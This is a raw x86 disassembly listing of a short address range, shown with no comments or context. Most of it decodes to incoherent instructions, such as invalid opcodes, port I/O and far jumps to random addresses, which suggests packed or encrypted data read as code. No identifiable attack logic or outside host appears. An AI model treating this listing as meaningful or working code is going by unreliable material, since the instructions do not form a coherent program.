  40c96d:	mov    eax,0x6dfea56e
  40c972:	adc    dh,BYTE PTR [ecx-0x58]
  40c975:	cmp    eax,0x429ca4f3
  40c97a:	jp     0x40c9d3
  40c97c:	jmp    0x40c975
  40c97e:	in     al,0x26
  40c980:	popf   
  40c981:	mov    ds:0xb0eed9,al
  40c986:	out    0xdc,eax
  40c988:	dec    edi
  40c989:	jo     0x40c99e
  40c98b:	les    esp,FWORD PTR [ebp-0x1f]
  40c98e:	rep ins BYTE PTR es:[edi],dx
  40c990:	(bad)
  40c994:	fild   QWORD PTR [ecx]
  40c996:	dec    ebp
  40c997:	sbb    al,0xdf
  40c999:	push   0x8b9da9bf
  40c99e:	adc    dh,BYTE PTR [edx+0x74]
  40c9a1:	jp     0x40c949
  40c9a3:	fst    QWORD PTR [edx+0x30]
  40c9a6:	std    
  40c9a7:	cmp    eax,DWORD PTR [ebx+0x5d]
  40c9aa:	push   edx
  40c9ab:	and    al,0x76
  40c9ad:	sub    ecx,esi
  40c9af:	push   esi
  40c9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b1:	mov    bl,BYTE PTR [ecx]
  40c9b3:	mov    al,0x4d
  40c9b5:	mov    ah,0x6e
  40c9b7:	adc    al,0x3c
  40c9b9:	mov    ebp,DWORD PTR [edx]
  40c9bb:	sub    al,0xb8
  40c9bd:	test   DWORD PTR [eax],edi
  40c9bf:	mov    ecx,0x20f9814a
  40c9c4:	xchg   edi,eax
  40c9c5:	mov    edi,0xd6c51e50
  40c9ca:	xchg   DWORD PTR [esi+0x13fadd01],eax
  40c9d0:	push   esi
  40c9d1:	or     al,0x85
  40c9d3:	sbb    eax,0xe69d4b8e
  40c9d8:	sub    eax,0x92b511f1
  40c9dd:	mov    bl,BYTE PTR [edx]
  40c9df:	dec    eax
  40c9e0:	add    eax,0xeba0a43
  40c9e5:	mov    ds:0xe366d5af,al
  40c9ea:	nop
  40c9eb:	push   0xffffffaa
  40c9ed:	xchg   BYTE PTR [edx+0x31],bl
  40c9f0:	psrlw  mm2,QWORD PTR [edi-0x679ed4c9]
  40c9f7:	fcmovnbe st,st(4)
  40c9f9:	inc    ebx
  40c9fa:	data16 fimul DWORD PTR [ebx+esi*8]
  40c9fe:	dec    edi
  40c9ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca00:	pushf  
  40ca01:	push   eax
  40ca02:	pop    esp
  40ca03:	ror    BYTE PTR [ebx-0xf61aab],1
  40ca09:	daa    
  40ca0a:	lea    esi,[ebx+0xa]
  40ca0d:	jp     0x40c9a9
  40ca0f:	ins    BYTE PTR es:[edi],dx
  40ca10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca11:	jbe    0x40c9a5
  40ca13:	cli    
  40ca14:	int    0xa6
  40ca16:	les    esp,FWORD PTR [esi+0x2a2ecdd]
  40ca1c:	push   ss
  40ca1d:	pop    eax
  40ca1e:	mov    edi,0xd850df33
  40ca23:	sbb    DWORD PTR [edi],ebx
  40ca25:	loopne 0x40c9ea
  40ca27:	mov    al,ds:0x56b957cd
  40ca2c:	jmp    0xb1bc8377
  40ca31:	pop    ds
  40ca32:	in     eax,dx
  40ca33:	dec    eax
  40ca34:	pushf  
  40ca35:	pop    ecx
  40ca36:	arpl   WORD PTR [edx],bx
  40ca38:	mov    ds:0x9ffd1831,al
  40ca3d:	push   ds
  40ca3e:	sub    ch,BYTE PTR [edi+edx*8+0x2aaabe3]
  40ca45:	adc    ebp,DWORD PTR [ecx-0x53]
  40ca48:	sbb    ebx,edx
  40ca4a:	stos   BYTE PTR es:[edi],al
  40ca4b:	fcom   DWORD PTR [ebx+0x6b109162]
  40ca51:	rol    DWORD PTR [edi+0x11],1
  40ca54:	scas   eax,DWORD PTR es:[edi]
  40ca55:	xlat   BYTE PTR ds:[ebx]
  40ca56:	or     dl,BYTE PTR ds:0x2a27c368
  40ca5c:	or     BYTE PTR [edx],dl
  40ca5e:	and    DWORD PTR [eax],esi
  40ca60:	jmp    0xf5436908
  40ca65:	jnp    0x40ca31
  40ca67:	cmp    bl,bl
  40ca69:	sbb    BYTE PTR [ebx],bh
  40ca6b:	popf   
  40ca6c:	cdq    
  40ca6d:	mov    bh,0x8c
  40ca6f:	push   esi
  40ca70:	jbe    0x40caf0
  40ca72:	hlt    
  40ca73:	xchg   edi,eax
  40ca74:	stos   BYTE PTR es:[edi],al
  40ca75:	nop
  40ca76:	add    DWORD PTR [eax-0x4ff1a93f],edx
  40ca7c:	sub    al,0x79
  40ca7e:	pop    ebx
  40ca7f:	sbb    eax,0x9585bcc1
  40ca84:	ds push eax
  40ca86:	or     edi,DWORD PTR [ebx]
  40ca88:	add    eax,0xbfb7c5a2
  40ca8d:	sbb    bh,BYTE PTR [ecx+0x5a85b931]
  40ca93:	xor    DWORD PTR [ecx],eax
  40ca95:	in     eax,dx
  40ca96:	and    cl,0x5b
  40ca99:	adc    dl,BYTE PTR [esi-0x33]
  40ca9c:	inc    ecx
  40ca9d:	inc    ecx
  40ca9e:	mov    esp,ecx
  40caa0:	dec    esp
  40caa1:	inc    esi
  40caa2:	mov    bh,0x2
  40caa4:	mov    ebx,0xe110c7ac
  40caa9:	mov    al,0xd3
  40caab:	gs fistp WORD PTR cs:[ebp-0x63]
  40cab0:	push   0x134872f4
  40cab5:	into   
  40cab6:	stc    
  40cab7:	push   es
  40cab8:	(bad)  
  40cab9:	jae    0x40cacc
  40cabb:	jns    0x40ca6d
  40cabd:	mov    esi,0x9b5c2696
  40cac2:	add    eax,0x4f0d579b
  40cac7:	dec    ecx
  40cac8:	or     DWORD PTR [edx-0x29],0xfbe187b5
  40cacf:	mov    ah,0x54
  40cad1:	test   DWORD PTR [esi-0x71],edx
  40cad4:	frstor [edx+0x4a]
  40cad7:	push   edx
  40cad8:	out    dx,eax
  40cad9:	out    dx,al
  40cada:	retf   0x5a3c
  40cadd:	push   es
  40cade:	push   ebp
  40cadf:	inc    ecx
  40cae0:	add    DWORD PTR [edi-0x35],edx
  40cae3:	cmp    eax,0xf789e1a6
  40cae8:	ret    0x1001
  40caeb:	mov    bl,0x25
  40caed:	or     al,0x1e
  40caef:	dec    esi
  40caf0:	push   ss
  40caf1:	fs jge 0x40ca80
  40caf4:	icebp  
  40caf5:	shr    DWORD PTR [esp+eax*4-0x69e57083],cl
  40cafc:	inc    esi
  40cafd:	cmp    BYTE PTR [eax-0xc],0x75
  40cb01:	fbstp  TBYTE PTR [esi]
  40cb03:	add    ah,BYTE PTR [edx-0x6c]
  40cb06:	aaa    
  40cb07:	cmp    DWORD PTR [esi-0x5c],esp
  40cb0a:	xor    eax,0x19da189a
  40cb0f:	inc    eax
  40cb10:	fist   WORD PTR [ecx+0x2f532773]
  40cb16:	xchg   ecx,eax
  40cb17:	(bad)  
  40cb18:	mov    ds:0x3a2d9fdc,eax
  40cb1d:	xor    al,0x14
  40cb1f:	pop    ebx
  40cb20:	sbb    BYTE PTR [ebx+0x39],al
  40cb23:	rcl    DWORD PTR [ebx],cl
  40cb25:	adc    eax,0x5ad6a7af
  40cb2a:	imul   edx,eax,0x3e
  40cb2d:	(bad)  
  40cb2f:	cmp    edi,ebx
  40cb31:	jbe    0x40cae6
  40cb33:	pop    ecx
  40cb34:	in     eax,0xc8
  40cb36:	inc    ebp
  40cb37:	dec    esp
  40cb38:	mov    ch,0x2f
  40cb3a:	call   esp
  40cb3c:	out    0x55,eax
  40cb3e:	push   edx
  40cb3f:	xchg   esi,eax
  40cb40:	inc    edx
  40cb41:	jae    0x40cb5d
  40cb43:	push   ebp
  40cb44:	jp     0x40cbb8
  40cb46:	pop    ecx
  40cb47:	sbb    DWORD PTR [ebx-0x6b9ae0ca],edi
  40cb4d:	ss in  al,0x3f
  40cb50:	sti    
  40cb51:	sub    al,0x9f
  40cb53:	mov    bh,BYTE PTR [edx-0x29b1aaea]
  40cb59:	fwait
  40cb5a:	neg    DWORD PTR [esi]
  40cb5c:	imul   ebx,DWORD PTR [di-0x78],0xffffffa6
  40cb61:	rol    BYTE PTR [edx-0x13],cl
  40cb64:	fwait
  40cb65:	out    0x4f,eax
  40cb67:	pop    edx
  40cb68:	fdivr  st(6),st
  40cb6a:	and    DWORD PTR [ecx-0x43],eax
  40cb6d:	pushf  
  40cb6e:	arpl   WORD PTR ds:0xdcdfe816,dx
  40cb74:	(bad)  
  40cb75:	jae    0x40cb9f
  40cb77:	mov    DWORD PTR ds:0xe1a325a,ebp
  40cb7d:	hlt    
  40cb7e:	(bad)  [ecx]
  40cb80:	mov    edi,0xb14a891f
  40cb85:	xor    BYTE PTR [ebp+0x472bf7ff],0x3b
  40cb8c:	outs   dx,BYTE PTR ds:[esi]
  40cb8d:	call   0xa3eb759d
  40cb92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb93:	hlt    
  40cb94:	jmp    0xb5b9b936
  40cb99:	xor    eax,0xe3007357
  40cb9e:	call   0x932a14f2
  40cba3:	scas   al,BYTE PTR es:[edi]
  40cba4:	lock mov ah,BYTE PTR cs:[ecx+0x5e5ba357]
  40cbac:	inc    edx
  40cbad:	int    0x6c
  40cbaf:	ja     0x40cb3a
  40cbb1:	pop    ecx
  40cbb2:	clc    
  40cbb3:	mov    BYTE PTR [edi],dh
  40cbb5:	into   
  40cbb6:	xchg   ebp,eax
  40cbb7:	xor    DWORD PTR [esi+0x58ebf3ce],edx
  40cbbd:	xchg   esi,eax
  40cbbe:	jp     0x40cbed
  40cbc0:	pop    ebx
  40cbc1:	int3   
  40cbc2:	dec    ebx
  40cbc3:	outs   dx,DWORD PTR ds:[esi]
  40cbc4:	mov    ds:0x3d1bdc0a,eax
  40cbc9:	push   ecx
  40cbca:	hlt    
  40cbcb:	pop    edx
  40cbcc:	out    dx,eax
  40cbcd:	(bad)  
  40cbce:	cld    
  40cbcf:	inc    eax
  40cbd0:	jl     0x40cbd9
  40cbd2:	push   cs
  40cbd3:	jecxz  0x40cbf3
  40cbd5:	in     al,dx
  40cbd6:	and    BYTE PTR [edi+0x1826021d],ah
  40cbdc:	xchg   ebp,eax
  40cbdd:	jle    0x40cbb9
  40cbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbe1:	nop
  40cbe2:	xor    dh,BYTE PTR [ebx]
  40cbe4:	pop    eax
  40cbe5:	stos   DWORD PTR es:[edi],eax
  40cbe6:	sub    ch,BYTE PTR [esi-0x18a4bcc2]
  40cbec:	out    0x91,eax
  40cbee:	jb     0x40cbb5
  40cbf0:	cmp    al,0x54
  40cbf2:	seta   BYTE PTR [ecx+0x5332c0d2]
  40cbf9:	adc    ebx,DWORD PTR [ebx]
  40cbfb:	add    ah,BYTE PTR [edx+0x4d32e9f4]
  40cc01:	sahf   
  40cc02:	jbe    0x40cc3c
  40cc04:	sar    bl,cl
  40cc06:	inc    edx
  40cc07:	inc    edx
  40cc08:	pop    ss
  40cc09:	addr16 sbb al,0xfe
  40cc0c:	(bad)  
  40cc0d:	adc    al,0x6d
  40cc0f:	cdq    
  40cc10:	jno    0x40cbc4
  40cc12:	lods   eax,DWORD PTR ds:[esi]
  40cc13:	jl     0x40cbab
  40cc15:	aad    0x1a
  40cc17:	xchg   DWORD PTR [ecx+0x30cfcfa3],ebx
  40cc1d:	jecxz  0x40cc5f
  40cc1f:	xlat   BYTE PTR ds:[ebx]
  40cc20:	sub    al,BYTE PTR [ecx-0x1e014586]
  40cc26:	aad    0xa7
  40cc28:	jmp    0xd346c08c
  40cc2d:	daa    
  40cc2e:	arpl   WORD PTR [ecx],dx
  40cc30:	div    edx
  40cc32:	jbe    0x40cc13
  40cc34:	dec    ebp
  40cc35:	icebp  
  40cc36:	mov    eax,0x3e2d530b
  40cc3b:	mov    al,ds:0x25fbd501
  40cc40:	xchg   esi,eax
  40cc41:	ret    
  40cc42:	push   ecx
  40cc43:	jns    0x40cc05
  40cc45:	rol    BYTE PTR [edi-0x41fbf778],0x21
  40cc4c:	mov    bl,0xcb
  40cc4e:	mov    cs,eax
  40cc50:	rcl    BYTE PTR [esi+0x36],cl
  40cc53:	mov    al,0xd1
  40cc55:	push   ebx
  40cc56:	mov    ch,0x11
  40cc58:	shl    DWORD PTR [eax+0x5a],1
  40cc5b:	in     eax,dx
  40cc5c:	or     eax,0x6fd8e685
  40cc61:	push   ss
  40cc62:	cmp    eax,0xff5e008d
  40cc67:	shl    BYTE PTR [edi+ebx*1-0x1a],1
  40cc6b:	in     al,dx
  40cc6c:	xor    ah,ah
  40cc6e:	fild   QWORD PTR [edx+0x5ad4096f]
  40cc74:	pop    ebp
  40cc75:	ror    BYTE PTR [edx-0x496210af],cl
  40cc7b:	int3   
  40cc7c:	push   ecx
  40cc7d:	mov    BYTE PTR [edi+ebp*2-0x1a],dh
  40cc81:	lds    ebp,FWORD PTR ds:0xd103a437
  40cc87:	add    edi,ecx
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	imul   ebp,ebp,0x923b40cb
  40ccac:	jl     0x40cd2a
  40ccae:	retf   0x7c79
  40ccb1:	jl     0x40ccd4
  40ccb3:	daa    
  40ccb4:	push   ebp
  40ccb5:	(bad)  
  40ccb6:	out    0x1f,eax
  40ccb8:	je     0x40ccbc
  40ccba:	mov    ds:0x42a0e417,eax
  40ccbf:	lahf   
  40ccc0:	dec    BYTE PTR [edx]
  40ccc2:	jnp    0x40ccb4
  40ccc4:	pop    ss
  40ccc5:	sbb    ch,BYTE PTR [ecx]
  40ccc7:	sub    eax,0x7c563847
  40cccc:	sahf   
  40cccd:	mov    esi,0x5243c972
  40ccd2:	sub    dl,BYTE PTR [edi]
  40ccd4:	pop    esp
  40ccd5:	and    al,0xf3
  40ccd7:	push   ecx
  40ccd8:	aaa    
  40ccd9:	in     al,dx
  40ccda:	pop    ss
  40ccdb:	ss call 0x6043:0xa0aee9f2
  40cce3:	jns    0x40cd49
  40cce5:	cmp    BYTE PTR [ebx+eiz*8],ch
  40cce8:	ja     0x40cd0b
  40ccea:	mov    eax,0x3fc53544
  40ccef:	call   0x4f83:0x76f90702
  40ccf6:	(bad)  
  40ccf7:	test   eax,0x327dfb05
  40ccfc:	jecxz  0x40cd0d
  40ccfe:	adc    eax,0x464b2678
  40cd03:	mov    DWORD PTR [ebx+0x3],ecx
  40cd06:	popa   
  40cd07:	(bad)  
  40cd08:	fldz   
  40cd0a:	pop    ebx
  40cd0b:	test   al,0x5a
  40cd0d:	out    dx,al
  40cd0e:	out    dx,eax
  40cd0f:	outs   dx,BYTE PTR ds:[esi]
  40cd10:	repnz adc eax,0x151f5d57
  40cd16:	and    dh,BYTE PTR [ebp-0x52]
  40cd19:	jecxz  0x40cc9f
  40cd1b:	rcl    DWORD PTR [ebp-0x55c3aa66],1
  40cd21:	jmp    0xcb3c:0xe4e3dcac
  40cd28:	push   0x13ef3f3c
  40cd2d:	int    0xa5
  40cd2f:	sbb    al,0x3e
  40cd31:	mov    cl,0x2c
  40cd33:	dec    bh
  40cd35:	call   0x47fdea94
  40cd3a:	jle    0x40ccf7
  40cd3c:	jns    0x40cd54
  40cd3e:	call   0x57cf:0x935761a5
  40cd45:	mov    ds:0xfe2dfb26,eax
  40cd4a:	in     eax,dx
  40cd4b:	rol    DWORD PTR [ebx],1
  40cd4d:	push   cs
  40cd4e:	inc    ebx
  40cd4f:	mov    ebx,0x35bd57c9
  40cd54:	jle    0x40cd7d
  40cd56:	mov    esp,0x701f8d4c
  40cd5b:	mov    ch,cl
  40cd5d:	sbb    BYTE PTR [edi+0x35d16738],0x7
  40cd64:	dec    eax
  40cd65:	pop    ss
  40cd66:	sbb    al,0x1e
  40cd68:	add    BYTE PTR [ebp-0x6f1aa4f5],cl
  40cd6e:	retf   
  40cd6f:	rol    DWORD PTR [edi+0xe6494a6],1
  40cd75:	ds pop edi
  40cd77:	pop    edi
  40cd78:	pop    ebx
  40cd79:	pop    esi
  40cd7a:	pop    ecx
  40cd7b:	ins    BYTE PTR es:[edi],dx
  40cd7c:	mov    ah,0x78
  40cd7e:	xlat   BYTE PTR ds:[ebx]
  40cd7f:	pop    edx
  40cd80:	adc    BYTE PTR [edi],0xef
  40cd83:	mov    esp,0xf51d124c
  40cd88:	push   eax
  40cd89:	shr    bh,cl
  40cd8b:	adc    DWORD PTR [ecx-0x6ee4ab44],eax
  40cd91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd92:	lods   al,BYTE PTR ds:[esi]
  40cd93:	mov    DWORD PTR [ebx+edx*8+0x7e],0x57252741
  40cd9b:	imul   esi
  40cd9d:	push   esi
  40cd9e:	xor    edi,0x6
  40cda1:	call   0x42fe59fd
  40cda6:	ds pop ebx
  40cda8:	mov    edx,0x8ecdce19
  40cdad:	jecxz  0x40cde3
  40cdaf:	pop    ebx
  40cdb0:	sub    DWORD PTR [ecx+edx*8],0x88061449
  40cdb7:	pop    ebx
  40cdb8:	sbb    DWORD PTR ds:[edx],0x52
  40cdbc:	push   ebx
  40cdbd:	mov    ecx,0xbf1124a5
  40cdc2:	pop    ss
  40cdc3:	jge    0x40cd80
  40cdc5:	jnp    0x40cd8a
  40cdc7:	lock je 0x40cdc2
  40cdca:	push   ebp
  40cdcb:	inc    eax
  40cdcc:	neg    BYTE PTR [ebx]
  40cdce:	fyl2x  
  40cdd0:	sbb    DWORD PTR [ebx+esi*8],edi
  40cdd3:	inc    ecx
  40cdd4:	mov    cl,0x36
  40cdd6:	and    bh,BYTE PTR [ebx]
  40cdd8:	out    0x54,eax
  40cdda:	loope  0x40cdff
  40cddc:	add    esi,DWORD PTR [edi]
  40cdde:	and    ah,BYTE PTR [ecx]
  40cde0:	or     BYTE PTR [edx-0x1c7dde7b],bl
  40cde6:	pop    esi
  40cde7:	mov    edx,0xbf4fb842
  40cdec:	inc    eax
  40cded:	jbe    0x40cd98
  40cdef:	fdivr  DWORD PTR [edx]
  40cdf1:	into   
  40cdf2:	fistp  WORD PTR [edx]
  40cdf4:	mov    DWORD PTR [ebp-0x2d],edx
  40cdf7:	push   0x3fc179da
  40cdfc:	add    al,0x47
  40cdfe:	cmp    dl,BYTE PTR [ebp+ecx*4+0x4]
  40ce02:	sub    eax,DWORD PTR [si+0x4f29]
  40ce07:	nop
  40ce08:	pop    ecx
  40ce09:	fucom  st(2)
  40ce0b:	lds    esi,FWORD PTR [ebx+0x75]
  40ce0e:	in     eax,0x8
  40ce10:	das    
  40ce11:	mov    al,0x46
  40ce13:	mov    WORD PTR [ecx-0xf],?
  40ce16:	repnz aam 0xba
  40ce19:	pop    edi
  40ce1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1b:	cmp    ebp,DWORD PTR [ebp+0x5c93abc9]
  40ce21:	push   ecx
  40ce22:	or     BYTE PTR [esi],dh
  40ce24:	stc    
  40ce25:	call   0x85648d87
  40ce2a:	jl     0x40cdc1
  40ce2c:	mov    dh,0x8c
  40ce2e:	mov    dh,0xe8
  40ce30:	in     eax,dx
  40ce31:	jle    0x40ce5f
  40ce33:	push   es
  40ce34:	jno    0x40ce0b
  40ce36:	xor    DWORD PTR [esi],esp
  40ce38:	fcmovnbe st,st(4)
  40ce3a:	call   0x951f:0xbb42e848
  40ce41:	adc    ah,BYTE PTR [ecx]
  40ce43:	ds pushw ss
  40ce46:	and    eax,0x7cbdbe96
  40ce4b:	xchg   BYTE PTR [eax+edi*4],cl
  40ce4e:	xor    ch,0x1a
  40ce51:	cmp    DWORD PTR [edx-0x5bf66183],0xf3c37684
  40ce5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce5c:	mov    bl,0x92
  40ce5e:	dec    edi
  40ce5f:	fnstsw WORD PTR ds:0xa2d2bc3f
  40ce65:	inc    esi
  40ce66:	iret   
  40ce67:	push   ebp
  40ce68:	gs jb  0x40ce6b
  40ce6b:	fimul  WORD PTR [edi-0x52]
  40ce6e:	jge    0x40ce1c
  40ce70:	scas   eax,DWORD PTR es:[edi]
  40ce71:	lahf   
  40ce72:	pop    ebx
  40ce73:	ret    
  40ce74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce75:	popa   
  40ce76:	cld    
  40ce77:	and    BYTE PTR [ecx-0x3f86c16e],dh
  40ce7d:	sbb    edi,esi
  40ce7f:	test   dl,0xdb
  40ce82:	mov    ebx,DWORD PTR [edx+0x61]
  40ce85:	pop    edi
  40ce86:	mov    eax,ebx
  40ce88:	xor    bl,BYTE PTR [ebx-0x78bbc3cc]
  40ce8e:	fnstcw WORD PTR [eax]
  40ce90:	aaa    
  40ce91:	shl    dl,0x42
  40ce94:	sbb    al,BYTE PTR [eax]
  40ce96:	das    
  40ce97:	mov    ebx,0xc85c1fba
  40ce9c:	mov    DWORD PTR [edx-0x7f],0x20dc721e
  40cea3:	cmp    al,0xa2
  40cea5:	and    DWORD PTR [ebx-0x326c1299],edi
  40ceab:	int    0x7a
  40cead:	adc    eax,0x42b32984
  40ceb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb3:	mov    fs,edx
  40ceb5:	xor    bl,BYTE PTR [ebp-0x7bef003]
  40cebb:	mov    ds:0x51abc5b8,eax
  40cec0:	ja     0x40ce9b
  40cec2:	mov    al,0xf
  40cec4:	scas   al,BYTE PTR es:[edi]
  40cec5:	mov    dl,0xc5
  40cec7:	nop
  40cec8:	xor    BYTE PTR [esi],bh
  40ceca:	(bad)  
  40cecb:	out    0x9f,eax
  40cecd:	xchg   BYTE PTR [esi+0x507a6059],ah
  40ced3:	xchg   DWORD PTR [ebp-0x7fafe7b6],eax
  40ced9:	mov    al,ds:0x40f031fd
  40cede:	push   0x942cd13d
  40cee3:	mov    esi,0x6e1e414f
  40cee8:	xchg   DWORD PTR [eax+eiz*2],esp
  40ceeb:	and    esp,DWORD PTR [ebx+0x5b178a88]
  40cef1:	xchg   ecx,eax
  40cef2:	add    bh,BYTE PTR [ebx+0x4f]
  40cef5:	mov    dh,0x76
  40cef7:	test   BYTE PTR [edx+edi*4+0x42],bh
  40cefb:	fisttp QWORD PTR [edi+0x2b]
  40cefe:	icebp  
  40ceff:	jo     0x40cec5
  40cf01:	mov    cl,0x50
  40cf03:	ret    
  40cf04:	or     bl,0x63
  40cf07:	neg    DWORD PTR [edi-0xb]
  40cf0a:	push   ss
  40cf0b:	sub    BYTE PTR [ebp+0x34cdc3bd],cl
  40cf11:	dec    esp
  40cf12:	fidivr WORD PTR [edx-0x40]
  40cf15:	out    0xbd,al
  40cf17:	(bad)  
  40cf18:	ins    BYTE PTR es:[edi],dx
  40cf19:	add    BYTE PTR [esp+edi*4+0x5ab5c413],bl
  40cf20:	cmp    al,0xa0
  40cf22:	dec    esp
  40cf23:	arpl   WORD PTR [edx-0x2d],dx
  40cf26:	add    dh,BYTE PTR [edi+0x6e]
  40cf29:	sub    DWORD PTR ss:[edi-0x61],0x81c57c5
  40cf31:	xchg   edx,eax
  40cf32:	loopne 0x40cf4a
  40cf34:	sub    DWORD PTR [ebx+0x5],esp
  40cf37:	dec    esp
  40cf38:	jmp    0x40cf19
  40cf3a:	or     edx,DWORD PTR [ecx]
  40cf3c:	mov    esi,0x6ad7f5a7
  40cf41:	not    BYTE PTR [edx-0x2ea291c]
  40cf47:	inc    eax
  40cf48:	add    dh,bl
  40cf4a:	ins    DWORD PTR es:[edi],dx
  40cf4b:	dec    esi
  40cf4c:	sub    edi,DWORD PTR [ecx-0x7da8ae92]
  40cf52:	push   0xd
  40cf54:	test   al,0x18
  40cf57:	push   ecx
  40cf58:	xchg   edx,eax
  40cf59:	stc    
  40cf5a:	add    al,0x92
  40cf5c:	lahf   
  40cf5d:	fsubr  st,st(0)
  40cf5f:	inc    esi
  40cf60:	inc    edi
  40cf61:	in     al,0xac
  40cf63:	dec    ecx
  40cf64:	dec    eax
  40cf65:	iret   
  40cf66:	sbb    ebp,eax
  40cf68:	(bad)  
  40cf69:	mov    bl,0xb7
  40cf6b:	in     eax,0x3
  40cf6d:	dec    esi
  40cf6e:	test   eax,0xd128a6b6
  40cf73:	(bad)  
  40cf74:	addr16 cmp eax,0xccd606ae
  40cf7a:	test   DWORD PTR [esi-0x1bedacf4],eax
  40cf80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf81:	push   ebp
  40cf82:	and    ch,bh
  40cf84:	stos   DWORD PTR es:[edi],eax
  40cf85:	nop
  40cf86:	repz pop ebx
  40cf88:	xchg   edx,eax
  40cf89:	sahf   
  40cf8a:	jg     0x40cfb9
  40cf8c:	iret   
  40cf8d:	mov    bh,0x24
  40cf8f:	jg     0x40cfa3
  40cf91:	inc    ecx
  40cf92:	pop    esp
  40cf93:	call   0x5c24cefd
  40cf98:	xchg   BYTE PTR [ecx+0x1c5db134],dh
  40cf9e:	or     eax,esp
  40cfa0:	(bad)  
  40cfa1:	mov    DWORD PTR [ebx],esi
  40cfa3:	add    dh,ch
  40cfa5:	mov    edx,0x75962a85
  40cfaa:	ins    DWORD PTR es:[edi],dx
  40cfab:	push   edx
  40cfac:	jp     0x40d012
  40cfae:	dec    edx
  40cfaf:	xchg   ebx,eax
  40cfb0:	cmp    al,0x66
  40cfb2:	(bad)  
  40cfb3:	pop    ebp
  40cfb4:	scas   eax,DWORD PTR es:[edi]
  40cfb5:	push   esp
  40cfb6:	push   eax
  40cfb7:	ins    DWORD PTR es:[edi],dx
  40cfb8:	mov    edx,esi
  40cfba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfbb:	int    0x73
  40cfbd:	mov    eax,ds:0xe5ca0c2a
  40cfc2:	mov    dl,0x61
  40cfc4:	sahf   
  40cfc5:	bound  esp,QWORD PTR fs:[ecx-0x1c]
  40cfc9:	dec    eax
  40cfca:	(bad)  
  40cfcb:	arpl   WORD PTR [edi+0xe],bp
  40cfce:	sbb    al,0xdf
  40cfd0:	je     0x40cf7b
  40cfd2:	retf   
  40cfd3:	test   DWORD PTR [ecx-0x4c],0xca3b3132
  40cfda:	rcl    ch,cl
  40cfdc:	mov    eax,0x474776bf
  40cfe1:	test   al,0xbb
  40cfe3:	ret    0x189f
  40cfe6:	mov    bl,0x9b
  40cfe8:	fistp  DWORD PTR [ecx]
  40cfea:	adc    eax,0xe81a32c8
  40cfef:	outs   dx,DWORD PTR ds:[esi]
  40cff0:	or     dl,BYTE PTR ds:0xc8a3f1c5
  40cff6:	xlat   BYTE PTR ds:[ebx]
  40cff7:	call   0x85815cbd
  40cffc:	dec    ebx
  40cffd:	out    0x76,al
  40cfff:	leave  
  40d000:	jmp    0x78a41e71
  40d005:	ins    DWORD PTR es:[edi],dx
  40d006:	fs mov edi,DWORD PTR cs:[ebp-0x24]
  40d00b:	xor    edx,eax
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	int3   
  40d024:	jecxz  0x40cfd6
  40d026:	pushf  
  40d027:	xchg   ecx,eax
  40d028:	lahf   
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40cffd
  40d030:	sub    BYTE PTR [eax+0x69bf5288],0x1a
  40d037:	sar    DWORD PTR [eax-0x2a08af47],1
  40d03d:	daa    
  40d03e:	xor    BYTE PTR [edi+edi*1+0x73],bl
  40d042:	aaa    
  40d043:	jo     0x40d082
  40d045:	pop    ecx
  40d046:	push   edi
  40d047:	jbe    0x40d071
  40d049:	dec    ebx
  40d04a:	dec    ebx
  40d04b:	pop    ebp
  40d04c:	popa   
  40d04d:	in     eax,0x1c
  40d04f:	inc    edi
  40d050:	ret    
  40d051:	arpl   WORD PTR [ebx-0x1af4c992],bp
  40d057:	pop    esi
  40d058:	xchg   ecx,eax
  40d059:	mov    al,ds:0x2e82c468
  40d05e:	xor    eax,0xa801187
  40d063:	push   esp
  40d064:	mov    WORD PTR [esi-0x62],gs
  40d067:	sub    BYTE PTR [eax-0x5d204142],0x3d
  40d06e:	or     DWORD PTR [esp+eiz*4-0x7610db82],esi
  40d075:	(bad)  
  40d076:	jecxz  0x40d097
  40d078:	stos   BYTE PTR es:[edi],al
  40d079:	sub    ebp,eax
  40d07b:	dec    esi
  40d07c:	std    
  40d07d:	mov    dl,0x59
  40d07f:	jne    0x40d0d0
  40d081:	sub    eax,0x234f7475
  40d086:	push   ebx
  40d087:	inc    edx
  40d088:	dec    ebp
  40d089:	pop    ebx
  40d08a:	sbb    BYTE PTR [esp+esi*8+0x50b9f486],dl
  40d091:	push   ss
  40d092:	retf   
  40d093:	icebp  
  40d094:	out    0x12,eax
  40d096:	outs   dx,DWORD PTR ds:[esi]
  40d097:	jmp    0x40d104
  40d099:	mov    al,0x2a
  40d09b:	nop
  40d09c:	mov    esi,0x207c3510
  40d0a1:	cmp    dh,BYTE PTR ds:0xf2e8eaef
  40d0a7:	jg     0x40d04d
  40d0a9:	push   es
  40d0aa:	sbb    bh,BYTE PTR [esi+ecx*2+0x18]
  40d0ae:	lds    ebp,FWORD PTR [edx+0x22947f43]
